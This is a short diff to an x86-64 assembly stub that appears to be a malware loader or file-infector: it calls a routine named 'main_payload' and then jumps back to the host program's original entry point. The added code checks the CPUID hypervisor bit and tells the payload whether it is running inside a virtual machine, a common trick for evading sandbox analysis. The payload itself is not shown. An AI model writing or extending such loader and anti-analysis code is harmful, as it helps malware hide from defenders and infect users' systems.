@@ -14,9 +14,24 @@ _next:
 
     sub rsp, 40           ; 32 bytes shadow space + 8 for alignment
 
-    mov rcx, 12           ; place argument in rcx
+    ; Check if running in a VM
+    xor eax, eax
+    inc eax
+    cpuid
+    bt ecx, 31          ; check hypervisor bit
+    jz _not_vm           ; if not set, jump to not_vm
+
+    ; If running in a VM, call main_payload with 1 argument
+    mov rcx, 1           ; set rcx to 1 to indicate VM
     call main_payload
 
+    jmp _restore_state
+
+_not_vm:
+    mov rcx, 0           ; set rcx to 0 to indicate non-VM
+    call main_payload
+
+_restore_state:
     add rsp, 40           ; free shadow space
 
     ; calculate the Original Entry Point (OEP) and jump to it
